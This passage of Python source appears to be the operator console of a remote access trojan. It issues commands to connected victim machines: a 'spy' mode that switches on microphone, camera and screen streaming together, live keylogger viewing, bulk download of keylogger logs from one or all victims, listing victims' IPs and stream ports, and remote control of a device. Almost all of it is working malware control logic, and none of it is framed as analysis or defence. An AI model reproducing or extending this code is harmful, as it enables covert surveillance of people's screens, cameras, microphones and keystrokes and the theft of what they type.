                elif testin(data, "screenStart", "screenstart", "screenRun", "screenrun", "Startscreen", "startscreen", "Runscreen", "runscreen"):
                    send("screen")
                elif testin(data, "screenStop", "screenstop", "Stopscreen", "stopscreen"):
                    screenStop(reload=True)
                elif testin(data, "cameraStart", "camerastart", "cameraRun", "camerarun", "camStart", "camstart", "camRun", "camrun", "Startcamera", "startcamera", "Runcamera", "runcamera", "Startcam", "startcam", "Runcam", "runcam"):
                    send("camera")
                elif testin(data, "cameraStop", "camerastop", "camStop", "camstop", "Stopcamera", "stopcamera", "Stopcam", "stopcam"):
                    cameraStop(reload=True)
                elif testin(data, "startmic", "micstart"):
                    send("microphone")
                elif testin(data, 'micStop'):
                    micStop(reload=True)
                elif testin(data, "spy"):
                    self.sendData("startmic")
                    sleep(0.5*setup.getSpeedInternetMultiplier())
                    self.sendData("cameraStart")
                    sleep(0.5*setup.getSpeedInternetMultiplier())
                    self.sendData("screenStart")
                elif testin(data, 'spyStop'):
                    self.sendData("micStop")
                    sleep(0.5*setup.getSpeedInternetMultiplier())
                    self.sendData("cameraStop")
                    sleep(0.5*setup.getSpeedInternetMultiplier())
                    self.sendData("screenStop")
                elif testin(datalist[0], "fasttap", "fastTap", "tapfast", "tapFast"):
                    datalist.pop(0)
                    print(datalist)
                    data = "fast "+" ".join(datalist)
                    send(data)
                elif testin(data, "cls", "clear"):
                    clear()
                elif testin(datalist[0], "time", "sleep"):
                    if not datalist[1]:
                        datalist.append(1)
                    sleep(int(datalist[1]))
                elif testin(datalist[0], "fastcontrol"):
                    Send = False
                    datalist.pop(0)
                    datalist = " ".join(datalist)
                    datalist = datalist.split("µ")
                    for i in range(len(datalist)):
                        datalist[i] = stopSpaceError(datalist[i])
                        self.sendData(datalist[i])
                    Send = True
                    send("severalcontrol "+addvar)
                elif testin(data, "listenKeylogger"):
                    send("listenKeyloggerTrue")
                    stop_display_continue_socket = False
                    threadingDisplayAll = threading.Thread(target=displayContinueSocket, args =(lambda : stop_display_continue_socket, ))
                    threadingDisplayAll.start()
                    print("press escape to quit")
                    while True:
                        try:
                            if keyboard.is_pressed("escape"):
                                break
                            elif keyboard.is_pressed("ctrl+p"):
                                print("pause")
                                if pause:
                                    pause = False
                                else:
                                    pause = True
                        except:
                            pass
                    send("listenKeyloggerFalse")
                    stop_display_continue_socket = True
                    threadingDisplayAll.join()
                elif testin("dlLogFile", datalist[0]):
                    try:
                        os.mkdir(pathDirFile+"\\log")
                    except:
                        pass
                    received = False
                    for thread in getConnected.getCurrentThreads():
                        if datalist[1] == "all":
                            thread.send("sendFileKeylogger")
                            recieveAndWritteFile(thread)
                            print("receive from", thread.getName())
                            sleep(0.5*setup.getSpeedInternetMultiplier())
                            received = None
                        elif (thread.getName() == datalist[1]) or (thread.getIp() == datalist[1]) or (thread.getFullIp() == datalist[1]):
                            thread.send("sendFileKeylogger")
                            recieveAndWritteFile(thread)
                            received = True
                            print("file is received from "+thread.getName())
                            break
                    if received != None and not received:
                        print("connexion not found")
                elif testin(datalist[0], "printInfoCon"):
                    if len(datalist) == 1:
                        for thread in getConnected.getCurrentThreads():
                            print(thread.getName()+":", thread.getFullIp())
                    elif testin(datalist[1], "admin", "dev", "all"):
                        for thread in getConnected.getCurrentThreads():
                            print(thread.getName()+":", thread.getFullIp(), thread.getId(), "\n", thread.getCurrentThreads(), "\n", thread.getCon(), "timeout:", thread.getTimeout(), "\nscreen:", thread.screenIsAlive(), thread.getPortScreen(), "\ncamera:", thread.cameraIsAlive(), thread.getPortScreen(), "\nmicrophone:", thread.micLives(), thread.getPortMic(), "\n")
                    else:
                        print("arguments dosn't exist")
                elif testin(data, "showInitInfo"):
                    for thread in getConnected.getCurrentThreads():
                        # print(thread.getName()+": "+thread.showInitInfo())
                        for key in thread.showInitInfo().keys():
                            print(key+": "+thread.showInitInfo()[key])
                elif testin(datalist[0], "control"):
                    if len(datalist) == 2:
                        for thread in getConnected.getCurrentThreads():
                            if (thread.getName() == datalist[1]) or (thread.getIp() == datalist[1]) or (thread.getFullIp() == datalist[1]):
                                self.sendData("screenStart")
                                thread.send("controlDevice")
                                self.QueuKeyloggerEvent(thread)
                                self.sendData("screenStop")
                                break
                else:
                    runThreadingSendAndReceive(data)
            except Exception as e:
                print(e)
                pass

def screenStop(MYTHREADS=mythreads, reload=False):
    for thread in MYTHREADS:
        try:
            thread.screenStop()
        except:
            pass
        if reload:
            try:
                thread.screenStart(thread.getPortScreen())
            except:
                pass

def cameraStop(MYTHREADS=mythreads, reload=False):
    for thread in MYTHREADS:
        try:
            thread.cameraStop()
        except:
            pass
        if reload:
            try:
                thread.cameraStart(thread.getPortCamera())
            except:
                pass

def micStop(MYTHREADS=mythreads, reload=False):
    for thread in MYTHREADS:
        try:
            thread.micStop()
            # print('mic stop')
        except:
            pass
        sleep(0.2*setup.getSpeedInternetMultiplier())
        if reload:
            try:
                thread.micStart(thread.getPortMic())
            except:
                pass
            # print('mic start')

progrun = True
CMD = Command()
while progrun:
    ip, Send, run = [], True, False
    affiche = []
    CMD.command(inputcolor(preset=1, content=">"))
    if ip:
        while list(duplicates(ip)):
            ip.pop(ip.index(list(duplicates(ip))[0]))
        loopScreenCam = 0
        threadConnected = []
        afficheIpPortConnected = []
        for ipToCo in ip:
            loop = 0
            for thread in mythreads:
                if thread.testIfSameIp(ipToCo):
                    try:
                        threadConnected.index(thread)
                        OK = False
                    except:
                        OK = True
                    if OK:
                        portScreenCamMic = 22224+loopScreenCam
                        threadConnected.append(thread)
                        afficheIpPortConnected.append(f"{thread.getIp()}:{thread.getPort()}")
                        thread.screenStart(portScreenCamMic)
                        thread.cameraStart(portScreenCamMic+1)
                        thread.micStart(portScreenCamMic+2)
                        run = True
                        break
                loop += 1
            loopScreenCam += 3
            if threadConnected:
                server = True
    while run == True and progrun == True:
        if ip:
            addvar = ""
            listIp = []
            error = False
            while list(duplicates(affiche)):
                affiche.pop(affiche.index(list(duplicates(affiche))[0]))
            for line in affiche:
                for connexion in CMD.sendData('list', RETURN=True):
                    if connexion.split("--->  ")[1] in listIp:
                        try:
                            affiche.pop(affiche.index(connexion.split("  --->  ")[1]))
                        except:
                            try:
                                affiche.pop(affiche.index(connexion.split("  --->  ")[0]))
                            except:
                                affiche.pop(affiche.index(connexion.split("  --->  ")[1].split(':')[0]))
                        error = True
                    listIp = connexion.split("--->  ")[1]
            if error:
                print('plusieur connexion sur le meme ip/port')
            affichage = ", ".join(affiche)
            if list(duplicates(affiche)):
                affichage = ", ".join(afficheIpPortConnected)
            CMD.sendData(input(fg(127)+ATTR_colored(1)+affichage+">"+reset))
        else:
            run = False
            print('tout les socket sont fermer')
    try:
        if server == True:
            screenStop(threadConnected)
            cameraStop(threadConnected)
            micStop(threadConnected)
            server = False
    except:
        pass

mainThread.do_run = False
fct.endingCode()
exit()
